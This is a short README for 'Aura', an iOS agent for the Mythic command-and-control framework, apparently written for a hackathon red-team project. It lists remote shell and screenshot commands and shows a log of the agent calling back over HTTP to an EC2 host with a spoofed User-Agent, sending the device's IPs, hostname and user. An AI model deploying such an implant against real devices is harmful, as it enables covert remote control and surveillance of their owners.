# Aura iOS Agent

## Description
Aura is an iOS payload designed to interact with a Mythic C2 (command and control) server and was developed over the [2024 Microsoft Global Hackathon](https://microsoft.sharepoint.com/sites/MicrosoftGlobalHackathon2024). To fit within the time constraint of one week:
* The agent communicates over plain text HTTP channels
* Mythic will manage and initate the agent builds per-usual, but the actual compilation and configuration of the agent will take place remotely on macOS w/iOS SDK outside of Docker.
* A limited number of commands will be implemented.

### Requirements
* iOS 12.5.7+

## Operator commands
| Description | Implemented Command |
| - | - |
| Take a screenshot | `take_screenshot` |
| Execute a shell command | `shell_execution [args]` |

## Execution example
```txt
Brandon-Daltons-iPad:~ mobile$ chmod +x aura && ./aura
2024-09-20 13:00:31.313 aura[1846:240399] C2 Configuration Data:
2024-09-20 13:00:31.314 aura[1846:240399] Callback Host: http://ec2-54-245-60-126.us-west-2.compute.amazonaws.com
2024-09-20 13:00:31.315 aura[1846:240399] Callback Port: 80
2024-09-20 13:00:31.316 aura[1846:240399] Headers: {
    "User-Agent" = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
}
2024-09-20 13:00:31.316 aura[1846:240399] Payload UUID: 2a2d1c2f-88a2-4e34-81a9-b7267ae93458
2024-09-20 13:00:31.318 aura[1846:240399] [DEBUG] Check-in URL: http://ec2-54-245-60-126.us-west-2.compute.amazonaws.com:80/agent_message
2024-09-20 13:00:31.495 aura[1846:240399] [DEBUG] Check-in Data:
{
    action = checkin;
    architecture = arm64;
    domain = local;
    "external_ip" = "136.24.173.189";
    host = "brandontonsipad.localdomain";
    "integrity_level" = 2;
    ips =     (
        "192.168.0.18"
    );
    os = "iOS 12.5.7";
    pid = 1846;
    "process_name" = aura;
    user = mobile;
    uuid = "2a2d1c2f-88a2-4e34-81a9-b7267ae93458";
}
```